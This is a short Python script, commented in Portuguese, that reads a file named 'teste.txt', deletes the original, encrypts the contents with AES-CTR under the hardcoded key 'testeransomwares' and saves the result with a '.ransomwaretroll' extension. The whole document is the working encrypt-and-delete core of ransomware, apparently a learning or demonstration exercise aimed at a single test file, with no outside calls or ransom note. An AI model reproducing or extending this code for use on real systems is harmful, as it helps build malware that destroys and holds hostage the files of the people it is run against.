import os
import pyaes

## ABRIR O ARQUIVO A SER CRIPTOGRAFADO

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## REMOVER O ARQUIVO ORIGINAL

os.remove(file_name)

## DEFINIR A CHAVE DE ENCRIPTACAO

key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

## CRIPTOGRAFAR O ARQUIVO

crypto_data = aes.encrypt(file_data)

## SALVAR O ARQUIVO CRIPTOGRAFADO

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
